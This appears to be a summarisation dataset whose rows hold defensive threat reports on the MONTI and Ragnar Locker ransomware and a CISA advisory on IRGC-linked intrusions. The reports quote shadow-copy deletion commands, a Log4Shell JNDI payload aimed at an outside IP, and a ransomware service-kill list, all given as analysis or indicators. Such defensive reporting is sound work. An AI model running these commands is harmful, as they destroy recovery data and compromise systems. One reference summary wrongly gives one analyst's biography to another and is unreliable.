BlackBerry Guide to the Log4J VulnerabilityBabuk Ransomware Shifts Attack Methods to Double ExtortionYashma Ransomware, Tracing the Chaos Family Tree";"The BlackBerry(r) Security Services Incident Response team was engaged on July 5, 2022, to perform a forensic investigation and respond to a ransomwarerelated security incident. The security incident occurred when a threat actor group calling itself ""MONTI"" obtained access to the client's environment. The threat actor apparently intruded via an exploitation of the wellknown ""Log4Shell"" vulnerability (a.k.a. CVE202144228) in the client's internetfacing VMware Horizon virtualization system. At the time the BlackBerry team was engaged, the operators had already initially encrypted 18 user desktops. They also encrypted a threeserver ESXi cluster that resulted in 21 virtualized servers being impacted. Figure 1 provides an overview of the incident.Figure 1 Overview of the ""MONTI strain"" ransomware incident The threat actor initially obtained access to the client's VMware Horizon Connection Broker server via Log4Shell exploitation on June 29, 2022. After entering the client's environment, it installed the Google Chrome(tm) browser and used it to download attack tools to the server. The threat actor also downloaded and installed two remote monitoring and maintenance (RMM) agents, AnyDesk and Action1, which we'll describe in more detail later. It used these agents to establish persistence within the network and to facilitate additional remote access. The attackers also used tooling they'd brought into the environment to dump credentials from memory and scan the network. They used Microsoft(r) Windows(r) builtin Remote Desktop Protocol (RDP) to connect to other servers, access data files on network shares, and eventually to deploy the ""MONTI"" stra Based on analysis conducted in this investigation, BlackBerry researchers believe that the Monti group has purposefully (and brazenly) mimicked the betterknown ""Conti"" team's tactics, techniques, and procedures (TTPs), along with many of its tools and its ransomware encryptor payload. It seems likely that attackers chose this blatant emulation strategy because of the availability of Conti group's internal communications, chat logs, training guides, realworld identities, and source code all of which were publicly leaked on the internet starting in February 2022. Having access to this trove of information effectively gave Monti threat actors a stepbystep guide to emulating Conti's notoriously successful activities. The attacker dumped the process memory of the Local Security Authority Server Service (LSASS) on the Horizon Connection Broker server, to a file named ""lsass.DMP."" This filename (specifically with the uppercase file suffix) is the default name given to files created from memory dumps of the LSASS process, when using Windows Task Manager. While attackers can change this filename, when this default name is used, this gives a hint at the provenance of the file. Monti's reuse of Conti's encryptor code allowed the BlackBerry IR team to extract full, unencrypted strings from encrypted log files. The ransomware payload we found was likely generated using the leaked Conti v2 builder. We believe that the attacker manually modified the leaked Conti v3 locker.exe executable to generate the anomalous key and nonce values. This could be done by using a hex editor to manually change the values. This malware is not ransomware. It is only capable of dumping Veeam credentials. The BlackBerry Incident Response team is made up of worldclass consultants dedicated to handling response and containment services for a wide range of incidents, including ransomware and Advanced Persistent Threat (APT) cases. We have a global consulting team standing by to assist you, providing aroundtheclock support where required, as well as local assistance. Please contact us here: https://www.blackberry.com/us/en/forms/cylance/handraiser/emergencyincidentresponsecontainment";en;{'r': 0.20793346129238643, 'p': 0.9558823529411765, 'f': 0.341565945567485};{'r': 0.13122046149569086, 'p': 0.8973384030418251, 'f': 0.22895949328695375};{'r': 0.2072936660268714, 'p': 0.9529411764705882, 'f': 0.34051497341824694}
https://www.cybereason.com/blog/threat-analysis-report-ragnar-locker-ransomware-targeting-the-energy-sector;THREAT ANALYSIS REPORT: Ragnar Locker Ransomware Targeting the Energy Sector;"The Cybereason Global Security Operations Center (GSOC) Team issues Threat Analysis Reports to inform on impacting threats. The Threat Analysis Reports investigate these threats and provide practical recommendations for protecting against them.In this Threat Analysis Report, the Cybereason GSOC investigates the Ragnar Locker malware family, a ransomware and a ransomware operator which has recently claimed to have breached DESFA, a Greek pipeline company.This report provides context over this recent breach as well as an overview of the Ragnar Locker ransomware through a dynamic analysis and a reverse engineering analysis.Key FindingsBreach of a Pipeline Company : DESFA is a strategic energy-related company that has been claimed by Ragnar Locker as their victim.: DESFA is a strategic energy-related company that has been claimed by as their victim. Security Evasion Capabilities : Ragnar Locker checks if specific products are installed, especially security products (antivirus), virtual-based software, backup solutions and IT remote management solutions.: Ragnar Locker checks if specific products are installed, especially security products (antivirus), virtual-based software, backup solutions and IT remote management solutions. Ransomware Actors Targeting the Energy Sector : This is the second important pipeline company that has been hit by ransomware, along with Colonial Pipeline . Furthermore, four energy companies have been hit recently by ransomware, including three in Europe.: This is the second important pipeline company that has been hit by ransomware, along with . Furthermore, four energy companies have been hit recently by ransomware, including three in Europe. Active for Three Years : Ragnar Locker is both a ransomware group and the name of the software in use. They have been running since 2019 and targeting critical industries. They use the double extortion scheme.: Ragnar Locker is both a ransomware group and the name of the software in use. They have been running since 2019 and targeting critical industries. They use the scheme. Excluding the Commonwealth of Independent States : Ragnar Locker avoids being executed from countries since the group is located in the Commonwealth of Independent States (CIS).The Cybereason Defense Platform can effectively detect and prevent Ragnar Locker ransomware:Cybereason Defense Platform Detects and Blocks Ragnar Locker RansomwareIntroductionThe Cybereason GSOC is investigating the Ragnar Locker ransomware following a recent breach that was reported by Ragnar Locker, on a Greek pipeline company named DESFA:Ragnar TOR page claiming they breached DESFAThis is not the first occurrence of ransomware attacks on pipeline companies: Colonial Pipeline was breached in March 2021, and this event still haunts industrial companies due to the impact it had on production.Additionally, this is one of the four energy providers that were hit by ransomware recently, including other ones in Europe:Hive ransomware posted ENN Group from China on their portal. ENN Group is an energy and natural gas producerransomware posted from China on their portal. ENN Group is an energy and natural gas producer BlackCat ransomware hit Creos / Encevo , an energy company from Luxembourgransomware hit , an energy company from Luxembourg South Staffordshire PLC announced being hit on the 15/08/2022, claimed by the CL0P ransomware gangFinally, Greece has an extremely strategic place for energy since gas from other places (Israel, for instance) flows to Europe.Ragnar Locker is ransomware that has been in use since at least December 2019, and is generally aimed at English-speaking users. The Ragnar Locker ransomware has been on the FBI's radar since the gang breached more than fifty organizations across ten critical infrastructure sectors.Ragnar Locker matches both the name of the ransomware group and the name of the ransomware binary. In this Threat Analysis Report, we detail the mechanisms driving Ragnar Locker through dynamic and static analysis of two samples.Technical AnalysisThe corresponding samples of Ragnar Locker that we analyzed differentiate themselves from the other ransomwares by their size (from 53KB to 100KB):Ragnar Locker Execution FlowIn the following sections, we first analyze Ragnar Locker dynamically through the Cybereason Defense Platform. Next, we analyze Ragnar Locker more deeply, through static analysis.Analysis with the Cybereason Defense PlatformIn this section, we analyzed the sample used in the attack through our Cybereason Defense Platform.Ransomware DetonationWe start this analysis by detonating one sample into a constrained laboratory live environment equipped with a Cybereason sensor:Cybereason Defense Platform process tree viewAs a result of the execution, we can observe a MalOp is created with the Ransomware detection type:MalOp created following the launch of Ragnar LockerFurther analysis of the behaviors associated with this detonation, we observe the launch of three additional processes, chronologically:Chronologically ordered (more recent at the top) processes resulting from Ragnar Locker executionRagnar Locker spawns the following children process:wmic.exe shadowcopy delete : This system command deletes all shadow copies on the victim's system, preventing data recovery by the victimThis system command deletes all shadow copies on the victim's system, preventing data recovery by the victim vssadmin delete shadows /all /quiet : This system command also deletes shadow copies, preventing data recovery by the victimThis system command also deletes shadow copies, preventing data recovery by the victim notepad.exe [User path]\RGNR_AABBCCDD.txt : This command launches Notepad.exe to show the ransom note to the victimMITRE ATT&CK lists both shadow copy deletion techniques:Looking at the ""Ragnar Locker.exe"" process, we observe that it contains 1081 file events, related to the encrypted files, and their new path, for instance:c:\users\localadmin\appdata\local\packages\microsoft.windows.cortana_cw5n1h2txyewy\localstate\devicesearchcache\appcache133057346751796032.txt.ragnar_aabbddccNew path after rename event""Ragnar Locker.exe"" process properties, as seen in the Cybereason Defense PlatformAdditional Sysmon telemetry was set up on the machine, resulting in observing the modification of strategic directories, due to the ransom note creation:Extract from Sysmon event logsWe did not observe any network connection following the ransomware execution, nor registry value manipulation.Ransomware NoteA few seconds following the ransomware execution , as seen from the process tree, Ragnar Locker drops a ransomware note configured with the name of the victim, named ""RGNR_AABBCCDD.txt"", and opens a Notepad with this file:Ransomware Note as seen by the victimRagnar Locker Sample Reverse EngineeringIn this section, we analyzed the sample used in the attack, this time through static analysis and advanced dynamic analysis, allowing us to dig deeper into this binary's goal and mechanisms.Checking System LocationThe first activity Ragnar Locker perform is to check if the infected machine's locale matches with one of the following countries:AzerbaijanArmeniaBelarusKazakhstanKyrgyzstanMoldovaTajikistanRussiaTurkmenistanUzbekistanUkraineGeorgiaIf this matches, Ragnar Locker does not execute and the process is terminated. This list matches with the countries found in the Commonwealth of Independent States CIS:Ragnar Locker check countries locale value through GetLocaleInfoWCollecting Host InformationNext, the ransomware extracts information about the infected machine. First, it collects the computer name and the user name using the API calls GetComputerNameW and GetUserNameW.Then, the ransomware queries the registry to collect the machine GUID and Windows version:Collecting info on the hostThis collected information is concatenated and goes through a custom hashing function, in order to conceal the data:Ragnar Locker custom hashing algorithmRagnar Locker then creates a new event using the CreateEventW API call, and uses the combined hashes as the name of the event:Creating event with combined hashes (static view)When running the sample through a debugger, the combined hashes look as following:Creating event with combined hashes (dynamic view)File Volumes IdentificationNext, Ragnar Locker attempts to identify the existing file volumes on the host. It uses the Windows APICreateFileW to:Get a handle to a physical driveQuery the drive using DeviceIoControlIterate through the volumes using FindFirstVolumeA and FindNextVolumeAIterating through machine volumesEmbedded RC4 ContentRagnar Locker contains hidden content embedded in the binary sections. Ragnar Locker decrypts this content during runtime using the RC4 cryptographic algorithm:Custom RC4 algorithmThe custom RC4 algorithm function is executed several times and decrypts a list of services names:vss, sql, memtas, mepocs, sophos, veeam, backup, pulseway, logme, logmein, connectwise, splashtop, kaseya, vmcompute, Hyper-v, vmms, Dfs.Decrypted RC4 services namesThen, Ragnar Locker iterates through the running services of the infected machines. If one of the decrypted services is found, Ragnar Locker terminates it:Enumerating the machine's servicesChecking if the targeted service existRagnar Locker then decrypts an embedded RSA public key:Decrypted RSA public keyAfter decrypting the public key, Ragnar Locker passes the key to another function that prepares the key for further use:Preparing the key for encryptionLastly, Ragnar Locker decrypts the ransom note's content:Decrypted ransom note through the RC4 routineDeleting Shadow CopiesIn order to delete the machine's shadow copies, Ragnar Locker executes the processes vssadmin.exe and Wmic.exe with the following command lines:Vssadmin delete shadows /all /quietWmic.exe shadowcopy deleteDeleting shadow copies using Wmic and VssadminCreating the Ransom NoteRagnar Locker generates the ransom note file name through the following algorithm:It gets the computer name using the API call GetComputerNameWIt hashes the computer name using the custom hashing algorithm mentioned aboveIt concatenates the strings ""\\"", ""RGNGR_"", "".txt"" with the hashed computer nameIt completes the full name by concatenating the path ""C:\Users\Public\Documents"", resulting in ""C:\Users\Public\Documents\RNGR_[hash].txt""Preparing the txt file that holds the ransom noteEventually, Ragnar Locker calls CreateFileW to create the requested text file with the required path. Ragnar Locker then writes a decrypted ransom note at this path.In addition, after writing the note, Ragnar Locker writes another smaller part starting with ""---RAGNAR SECRET---"". This part is the output of the API call CryptBinaryToStringA:Creating the txt file that holds the ransom noteRagnar secret example outputEncrypting the FilesAfter creating the ransom note, the actual file encryption process ignites. First, Ragnar Locker gets the drives (except DRIVE_CDROM) and directories, and sends the string of the file to be encrypted to an encryption function.The encryption function first checks for some files to be excluded from the encryption process, those files are:Autoruns.inf, boot.ini, bootfront.bin, bootsect.bak, bootmgr, bootmgr.efi, bootmgfw.efi, desktop.ini, iconcache.db, ntldr, ntuser.dat, ntuser.dat.log, ntuser.ini, thumbs.dbList of excluded filesIn addition, other specific processes and objects are excluded, such as:Windows.old, Tor Browser, Internet Explorer, Google, Opera, Opera Software, Mozilla, Mozilla Firefox, $Recycle.bin, ProgramData, All UsersFiles and processes to excludeLastly, the last checks of Ragnar Locker excludes files with the following extension:.db, .sys, .dll, lnk, .msi, .drv, .exeFile extensions to excludeOnce the file meets the criteria, the file name is sent to a function that encrypts the corresponding file using the Salsa20 algorithm. After each encryption, Ragnar Locker appends the suffix "".ragnar_[hashed computer name]"" to the affected file:Files manipulated by encryptionDisplaying the Ransom NoteFollowing the machine encryption, Ragnar Locker creates a notepad.exe process that presents the ransom note to the user's screen with the ransom and payment information.Ragnar Locker spawns this process through the following way:Getting a handle to the current process tokenDuplicate the tokenSetting the token to elevate privilegesUse CreateProcessAsUserW with the elevated tokenCreating notepad process to display ransom noteDisplayed ransom noteDetection and PreventionCybereason Defense PlatformThe Cybereason Defense Platform is able to detect and prevent infections with Ragnar Locker ransomware, using multi-layer protection that detects and blocks malware with threat intelligence, machine learning, anti-ransomware and Next-Gen Antivirus (NGAV) capabilities:The Cybereason Defense Platform creates a MalOp and labels it as Ransomware behaviorThe Cybereason Defense Platform suspends Ragnar Locker when Anti-Ransomware feature is set to ""Suspend"" as seen from the Cybereason Defense PlatformCybereason GSOC MDRThe Cybereason GSOC recommends the following:Enable Anti-Ransomware in your environment's policies, set the Anti-Ransomware mode to Prevent, and enable Shadow Copy detection to ensure maximum protection against ransomware.In the Cybereason Defense Platform, enable Application Control to block the execution of malicious files.To hunt proactively, use the Investigation screen in the Cybereason Defense Platform and the queries in the Hunting Queries section to search for machines that are potentially infected with Ragnar Locker. Based on the search results, take further remediation actions, such as isolating the infected machines and deleting the payload file.Cybereason is dedicated to teaming with defenders to end cyber attacks from endpoints to the enterprise to everywhere. Schedule a demo today to learn how your organization can benefit from an operation-centric approach to security.MITRE ATT&CK MappingTactic Technique or Sub-technique TA0005: Defense Evasion T1562.001: Impair Defenses: Disable or Modify Tools TA0007: Discovery T1033: System Owner/User Discovery TA0007: Discovery T1057: Process Discovery TA0007: Discovery T1082: System Information Discovery TA0007: Discovery T1614: System Location Discovery TA0040: Impact T1486: Data Encrypted for Impact TA0040: Impact T1489: Service Stop TA0040: Impact T1490: Inhibit System RecoveryIOCsIndicators Indicator type Description 041fd213326dd5c10a16caf88ff076bb98c68c052284430fba5f601023d39a14 SHA256 Ragnar Locker Binary 04c9cc0d1577d5ee54a4e2d4dd12f17011d13703cdd0e6efd46718d14fd9aa87 SHA256 Ragnar Locker Binary 0766beb30c575fc68d1ca134bd53c086d2ce63b040e4d0bbd6d89d8c26ca04f6 SHA256 Ragnar Locker Binary 0aaa7a3596af6b1aae02b6e6ca878045360d467f96b0687363a9dce19ea60a36 SHA256 Ragnar Locker Binary 10f9ad4e9f6e0dc1793be80203b258f8c5114d01cb17307c1b2fdcca37d4edf9 SHA256 Ragnar Locker Binary 1318f8a4566a50537f579d24fd1aabcf7e22e89bc75ffd13b3088fc6e80e9a2a SHA256 Ragnar Locker Binary 1472f5f559f90988f886d515f6d6c52e5d30283141ee2f13f92f7e1f7e6b8e9e SHA256 Ragnar Locker Binary 1602d04000a8c7221ed0d97d79f3157303e209d4640d31b8566dd52c2b09d033 SHA256 Ragnar Locker Binary 30dcc7a8ae98e52ee5547379048ca1fc90925e09a2a81c055021ba225c1d064c SHA256 Ragnar Locker Binary 3b43751ed88e4d1f82cf52ca2d4477e3e35c35f08c1b4e3ab21c80720601e804 SHA256 Ragnar Locker Binary 3bc8ce79ee7043c9ad70698e3fc2013806244dc5112c8c8d465e96757b57b1e1 SHA256 Ragnar Locker Binary 5469182495d92a5718e0e1dcdf371e92b79724e427050154f318de693d341c89 SHA256 Ragnar Locker Binary 5fc6f4cfb0d11e99c439a13b6c247ec3202a9a343df63576ce9f31cffcdbaf76 SHA256 Ragnar Locker Binary 60233700ee64b9e5d054fa551688e8617328b194534a0fe645411685ce467128 SHA256 Ragnar Locker Binary 63096f288f49b25d50f4aea52dc1fc00871b3927fa2a81fa0b0d752b261a3059 SHA256 Ragnar Locker Binary 68eb2d2d7866775d6bf106a914281491d23769a9eda88fc078328150b8432bb3 SHA256 Ragnar Locker Binary 6fd4ec6611bf7e691be80483bcf860e827d513df45e20d78f29cf4638b6c20e8 SHA256 Ragnar Locker Binary 7af61ce420051640c50b0e73e718dd8c55dddfcb58917a3bead9d3ece2f3e929 SHA256 Ragnar Locker Binary 91128776769d4f78dd177695df610463a0b05e2174ba76d0489b976b99cae223 SHA256 Ragnar Locker Binary 9416e5a57e6de00c685560fa9fee761126569d123f62060792bf2049ebba4151 SHA256 Ragnar Locker Binary 9706a97ffa43a0258571def8912dc2b8bf1ee207676052ad1b9c16ca9953fc2c SHA256 Ragnar Locker Binary 9b62cdb57f4c34924333dfa3baefd993efeab68109580b682b074f0e73b63983 SHA256 Ragnar Locker Binary 9bdd7f965d1c67396afb0a84c78b4d12118ff377db7efdca4a1340933120f376 SHA256 Ragnar Locker Binary a8ee0fafbd7b84417c0fb31709b2d9c25b2b8a16381b36756ca94609e2a6fcf6 SHA256 Ragnar Locker Binary ac16f3e23516cf6b22830c399b4aba9706d37adceb5eb8ea9960f71f1425df79 SHA256 Ragnar Locker Binary afab912c41c920c867f1b2ada34114b22dcc9c5f3666edbfc4e9936c29a17a68 SHA256 Ragnar Locker Binary b0d8f9aa9566245362d7e7443ab4add80ce90fbdf35a30df9a89e9dae5f22190 SHA256 Ragnar Locker Binary b6663af099538a396775273d79cb6fff99a18e2de2a8a2a106de8212cc44f3e2 SHA256 Ragnar Locker Binary b670441066ff868d06c682e5167b9dbc85b5323f3acfbbc044cabc0e5a594186 SHA256 Ragnar Locker Binary b72beb391c75af52c6fb62561f26214b682f12d95660b128d9e21e18e3bff246 SHA256 Ragnar Locker Binary c2bd70495630ed8279de0713a010e5e55f3da29323b59ef71401b12942ba52f6 SHA256 Ragnar Locker Binary ce33096639fb5c51684e9e3a7c7c7161884ecad29e8d6ad602fd8be42076b8d4 SHA256 Ragnar Locker Binary cf5ec678a2f836f859eb983eb633d529c25771b3b7505e74aa695b7ca00f9fa8 SHA256 Ragnar Locker Binary dd5d4cf9422b6e4514d49a3ec542cffb682be8a24079010cda689afbb44ac0f4 SHA256 Ragnar Locker Binary ec35c76ad2c8192f09c02eca1f263b406163470ca8438d054db7adcf5bfc0597 SHA256 Ragnar Locker BinaryAbout the ResearchersEli Salem, Principal Security Analyst, Cybereason Global SOCEli is a lead threat hunter and malware reverse engineer at Cybereason. He has worked in the private sector of the cyber security industry since 2017. In his free time, he publishes articles about malware research and threat hunting.Loic Castel, Principal Security Analyst, Cybereason Global SOCLoic is a Principal Security Analyst with the Cybereason Global SOC team. Loic analyses and researches critical incidents and cybercriminals, in order to better detect compromises. In his career, Loic worked as a security auditor in well-known organizations such as ANSSI (French National Agency for the Security of Information Systems) and as Lead Digital Forensics & Incident Response at Atos. Loic loves digital forensics and incident response, but is also interested in offensive aspects such as vulnerability research.";Loic Castel is a Principal Security Analyst with the Cybereason Global SOC team. He has worked in the private sector of the cyber security industry since 2017. In his free time, he publishes articles about malware research and threat hunting. He has worked as a security auditor in wellknown organizations such as ANSSI (French National Agency for the Security of Information Systems) and as Lead Digital Forensics & Incident Response at Atos. Loic loves digital forensics and incident response, but is also interested in offensive aspects such as vulnerability research.;en;{'r': 0.07204301075268817, 'p': 0.9710144927536232, 'f': 0.13413413284816347};{'r': 0.04555808656036447, 'p': 0.9302325581395349, 'f': 0.08686210551590882};{'r': 0.07204301075268817, 'p': 0.9710144927536232, 'f': 0.13413413284816347}
https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-257a;Iranian Islamic Revolutionary Guard Corps-Affiliated Cyber Actors Exploiting Vulnerabilities for Data Extortion and Disk Encryption for Ransom Operations;"SummaryActions to take today to protect against ransom operations:* Keep systems and software updated and prioritize remediating known exploited vulnerabilities.* Enforce MFA.* Make offline backups of your data.This joint Cybersecurity Advisory (CSA) is the result of an analytic effort among the Federal Bureau of Investigation (FBI), the Cybersecurity and Infrastructure Security Agency (CISA), the National Security Agency (NSA), U.S. Cyber Command (USCC) - Cyber National Mission Force (CNMF), the Department of the Treasury (Treasury), the Australian Cyber Security Centre (ACSC), the Canadian Centre for Cyber Security (CCCS), and the United Kingdom's National Cyber Security Centre (NCSC) to highlight continued malicious cyber activity by advanced persistent threat (APT) actors that the authoring agencies assess are affiliated with the Iranian Government's Islamic Revolutionary Guard Corps (IRGC). Note: The IRGC is an Iranian Government agency tasked with defending the Iranian Regime from perceived internal and external threats. Hereafter, this advisory refers to all the coauthors of this advisory as ""the authoring agencies.""This advisory updates joint CSA Iranian Government-Sponsored APT Cyber Actors Exploiting Microsoft Exchange and Fortinet Vulnerabilities in Furtherance of Malicious Activities, which provides information on these Iranian government-sponsored APT actors exploiting known Fortinet and Microsoft Exchange vulnerabilities to gain initial access to a broad range of targeted entities in furtherance of malicious activities, including ransom operations. The authoring agencies now judge these actors are an APT group affiliated with the IRGC.Since the initial reporting of this activity in the FBI Liaison Alert System (FLASH) report APT Actors Exploiting Fortinet Vulnerabilities to Gain Access for Malicious Activity from May 2021, the authoring agencies have continued to observe these IRGC-affiliated actors exploiting known vulnerabilities for initial access. In addition to exploiting Fortinet and Microsoft Exchange vulnerabilities, the authoring agencies have observed these APT actors exploiting VMware Horizon Log4j vulnerabilities for initial access. The IRGC-affiliated actors have used this access for follow-on activity, including disk encryption and data extortion, to support ransom operations.The IRGC-affiliated actors are actively targeting a broad range of entities, including entities across multiple U.S. critical infrastructure sectors as well as Australian, Canadian, and United Kingdom organizations. These actors often operate under the auspices of Najee Technology Hooshmand Fater LLC, based in Karaj, Iran, and Afkar System Yazd Company, based in Yazd, Iran. The authoring agencies assess the actors are exploiting known vulnerabilities on unprotected networks rather than targeting specific targeted entities or sectors.This advisory provides observed tactics, techniques, and indicators of compromise (IOCs) that the authoring agencies assess are likely associated with this IRGC-affiliated APT. The authoring agencies urge organizations, especially critical infrastructure organizations, to apply the recommendations listed in the Mitigations section of this advisory to mitigate risk of compromise from these IRGC-affiliated cyber actors.For a downloadable copy of IOCs, see AA22-257A.stix.For more information on Iranian state-sponsored malicious cyber activity, see CISA's Iran Cyber Threat Overview and Advisories webpage and FBI's Iran Threat webpage.Download the PDF version of this report: pdf, 836 kbTechnical DetailsThreat Actor ActivityAs reported in joint CSA Iranian Government-Sponsored APT Cyber Actors Exploiting Microsoft Exchange and Fortinet Vulnerabilities in Furtherance of Malicious Activities, the authoring agencies have observed Iranian government-sponsored APT actors scanning for and/or exploiting the following known Fortinet FortiOS and Microsoft Exchange server vulnerabilities since early 2021 to gain initial access to a broad range of targeted entities: CVE-2018-13379, CVE-2020-12812, CVE-2019-5591, and CVE-2021-34473 (a ProxyShell vulnerability). The authoring agencies have also observed these APT actors leveraging CVE-2021-34473 against U.S. networks in combination with ProxyShell vulnerabilities CVE-2021-34523 and CVE-2021-31207. The NCSC judges that Yazd, Iran-based company Afkar System Yazd Company is actively targeting UK organizations. Additionally, ACSC judges that these APT actors have used CVE-2021-34473 in Australia to gain access to systems. The APT actors can leverage this access for further malicious activities, including deployment of tools to support ransom and extortion operations, and data exfiltration.Since the activity was reported in 2021, these IRGC-affiliated actors have continued to exploit known vulnerabilities for initial access. In addition to exploiting Fortinet and Microsoft Exchange vulnerabilities, the authoring agencies have observed these APT actors exploiting VMware Horizon Log4j vulnerabilities CVE-2021-44228 (""Log4Shell""), CVE-2021-45046, and CVE-2021-45105 for initial access.The IRGC-affiliated actors have used their access for ransom operations, including disk encryption and extortion efforts. After gaining access to a network, the IRGC-affiliated actors likely determine a course of action based on their perceived value of the data. Depending on the perceived value, the actors may encrypt data for ransom and/or exfiltrate data. The actors may sell the data or use the exfiltrated data in extortion operations or ""double extortion"" ransom operations where a threat actor uses a combination of encryption and data theft to pressure targeted entities to pay ransom demands.IRGC-affiliated actor activity observed by the authoring agencies includes:In December 2021, the actors exploited ProxyShell vulnerabilities (likely CVE-2021-34473, CVE-2021-34523, and CVE-2021-31207) on a Microsoft Exchange server to gain access to the network of a U.S. police department. The actors used their access to move laterally within the network, encrypt network devices with BitLocker, and hold the decryption keys for ransom.In December 2021, the actors exploited ProxyShell vulnerabilities (likely CVE-2021-34473, CVE-2021-34523, and CVE-2021-31207), on a Microsoft Exchange server to gain access to the network of a U.S. regional transportation company. The actors used their access to move laterally within the network, encrypt network devices with BitLocker, and hold the decryption keys for ransom. This activity disrupted the transportation company's operations for an extended period.In February 2022, the actors exploited a Log4j vulnerability (likely CVE-2021-44228, CVE-2021-45046, and/or CVE-2021-45105) in a VMware Horizon application to gain access to the network of a U.S. municipal government, move laterally within the network, establish persistent access, initiate crypto-mining operations, and conduct additional malicious activity.In February 2022, the actors may have exploited a Log4j vulnerability (likely CVE-2021-44228, CVE-2021-45046, and/or CVE-2021) to gain access to the network of a U.S. aerospace company. The actors leveraged a server that the authoring agencies assess is associated with the IRGC-affiliated actors to exfiltrate data from the company's network.MITRE ATT&CK(r) Tactics and TechniquesNote: This advisory uses the MITRE ATT&CK for Enterprise framework, version 11. See Appendix B for a table of the MITRE ATT&CK tactics and techniques observed.The authoring agencies assess the following tactics and techniques are associated with this activity.Resource Development [TA0042]The IRGC-affiliated actors have used the following malicious and legitimate tools [T1588.001, T1588.002] for a variety of tactics across the enterprise spectrum:Fast Reverse Proxy (FRP) for command and control (C2)Plink for C2Remote Desktop Protocol (RDP) for lateral movementBitLocker for data encryptionSoftPerfect Network Scanner for system network configuration discoveryNote: For additional tools used by these IRGC-affiliated cyber actors, see joint CSA Iranian Government-Sponsored APT Cyber Actors Exploiting Microsoft Exchange and Fortinet Vulnerabilities in Furtherance of Malicious Activities.Initial Access [TA0001]As stated in the Technical Details section previously reported in joint CSA Iranian Government-Sponsored APT Cyber Actors Exploiting Microsoft Exchange and Fortinet Vulnerabilities in Furtherance of Malicious Activities, the IRGC-affiliated actors gained initial access by exploiting known vulnerabilities [T1190].The following IOCs, observed as of March 2022, are indicative of ProxyShell vulnerability exploitation on targeted entity networks:Web shells with naming conventions aspx_[11 randomly generated alphabetic characters].aspx, login.aspx, or default.aspx in any of the following directories: C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\ecp\auth\ C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\ C:\inetpub\wwwroot\aspnet_client\The following IOCs, observed as of December 2021, are indicative of Log4j vulnerability exploitation on targeted entity networks:${jndi:ldap//148.251.71.182:1389/RCE} (user agent string)RCE.classExecution [TA0002]The IRGC-affiliated actors may have made modifications to the Task Scheduler [T1053.005]. These modifications may display as unrecognized scheduled tasks or actions. Specifically, the below established tasks may be associated with this activity:WininetWininet'WinLogonCacheTaskNote: The potential exists that tasks associated with CacheTask or Wininet may be legitimate. For additional tasks used by these IRGC-affiliated cyber actors, see joint CSA Iranian Government-Sponsored APT Cyber Actors Exploiting Microsoft Exchange and Fortinet Vulnerabilities in Furtherance of Malicious Activities.Persistence [TA0003]The IRGC-affiliated actors established new user accounts on domain controllers, servers, workstations, and active directories [T1136.001, T1136.002]. The actors enabled a built-in Windows account (DefaultAccount) and escalated privileges to gain administrator-level access to a network. Some of these accounts appear to have been created to look similar to other existing accounts on the network, so specific account names may vary per organization. In addition to unrecognized user accounts or accounts established to masquerade as existing accounts, the following account usernames may be associated with this activity:Domain Adminit_adminDefaultAccountDefault01Note: For additional account usernames associated with this activity, see joint CSA Iranian Government-Sponsored APT Cyber Actors Exploiting Microsoft Exchange and Fortinet Vulnerabilities in Furtherance of Malicious Activities.Exfiltration [TA0010]The authoring agencies have observed the IRGC-affiliated actors dumping and subsequently exfiltrating the Local Security Authority Subsystem Service (LSASS) process memory on targeted entity networks in furtherance of credential harvesting. The following IOCs are associated with data exfiltration from targeted entity networks:C:\Windows\Temp\sassl[.]pmdC:\Windows\Temp\ssasl[.]zipC:\Users\DefaultAccount\AppData\Local\Temp\lsass[.]dmpC:\Users\DefaultAccount\AppData\Local\Temp\lsass[.]zipImpact [TA0040]The IRGC-affiliated actors forced BitLocker activation on host networks to encrypt data [T1486] and held the decryption keys for ransom. The corresponding ransom notes were sent to the targeted entity, left on the targeted entity network as a .txt file or printed on the targeted entity's networked printer(s). The notes included the following contact information:@BuySafety (Telegram)@WeRBits (Telegram)+93794415076 (WhatsApp)werbits@onionmail[.]orgbuysafety@onionmail[.]orgyacashcash@rambler[.]ruNote: For additional contact information included in ransom notes, see joint CSA Iranian Government-Sponsored APT Cyber Actors Exploiting Microsoft Exchange and Fortinet Vulnerabilities in Furtherance of Malicious Activities.DETECTIONThe authoring agencies recommend that organizations using Microsoft Exchange servers, Fortinet devices, and/or VMware Horizon applications investigate potential suspicious activity in their networks.Search for IOCs. Collect known-bad IOCs and search for them in network and host artifacts. Note : Refer to Appendix A for IOCs.Review Log4j vulnerabilities, including CVE-2021-44228, CVE-2021-45046, and CVE-2021- 45105.Review Microsoft Exchange ProxyShell vulnerabilities, including CVE-2021-34473, CVE-2021- 34523, and CVE-2021-31207.As a precaution, review additional Microsoft Exchange vulnerabilities, including CVE-2021- 31196, CVE-2021-31206, CVE-2021-33768, CVE-2021-33766, and CVE-2021-34470 because the authoring agencies have seen the actors broadly target Microsoft Exchange servers.Investigate exposed Microsoft Exchange servers, both patched and unpatched, for compromise.Review Fortinet FortiOS vulnerabilities, including CVE-2018-13379, CVE-2020-12812, and CVE-2019-5591.Review VMware vulnerabilities, including any relevant vulnerabilities listed on the VMware security advisory page.Investigate changes to RDP, firewall, and Windows Remote Management (WinRM) configurations that may allow malicious cyber actors to maintain persistent access.Review domain controllers, servers, workstations, and active directories for new or unrecognized user accounts.Review Task Scheduler for unrecognized scheduled tasks. Additionally, manually review operating-system and scheduled tasks--including each step these tasks perform--for unrecognized ""actions.""Review antivirus logs for indications they were unexpectedly turned off.Look for WinRAR and FileZilla in unexpected locations.Review servers and workstations for malicious executable files masquerading as legitimate Windows processes. Malicious files may not be found in the expected directory and may have cmd.exe or powershell.exe as their parent process.Note: For additional approaches on uncovering malicious cyber activity, see joint advisory Technical Approaches to Uncovering and Remediating Malicious Activity, authored by CISA and the cybersecurity authorities of Australia, Canada, New Zealand, and the United Kingdom.MitigationsThe authoring agencies urge network defenders to prepare for and mitigate potential cyber threats immediately by implementing the mitigations below.Implement and Enforce Backup and Restoration Policies and ProceduresMaintain offline (i.e., physically disconnected) backups of data, and regularly test backup and restoration. These practices safeguard an organization's continuity of operations or at least minimize potential downtime from a ransomware or other destructive data incident and protect against data losses. Ensure all backup data is encrypted, immutable (i.e., cannot be altered or deleted), and covers the entire organization's data infrastructure.Activate BitLocker on all networks and securely back up BitLocker keys with Microsoft and with an independent offline backup.Create, maintain, and exercise a basic 